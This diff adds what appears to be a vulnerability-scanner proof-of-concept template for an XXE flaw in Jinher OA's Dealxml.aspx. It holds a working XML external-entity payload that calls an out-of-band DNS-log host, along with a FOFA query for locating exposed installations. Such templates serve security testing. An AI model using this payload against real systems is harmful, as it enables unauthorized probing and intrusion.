@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-dealxml-aspx-xxe
+info:
+  name: 金和OA Dealxml.aspx XML实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /c6/JHSoft.Web.Appraise/Dealxml.aspx/
+  headers:
+    Content-Type: application/xml
+  data: '<?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{.domain}}"> %remote;]>'
+  expression: 'status_code == 200 &&
+
+    body == "" &&
+
+    contains(headers,"SessionId=") &&
+
+    reverse.Verify()
+
+    '
+transport: http
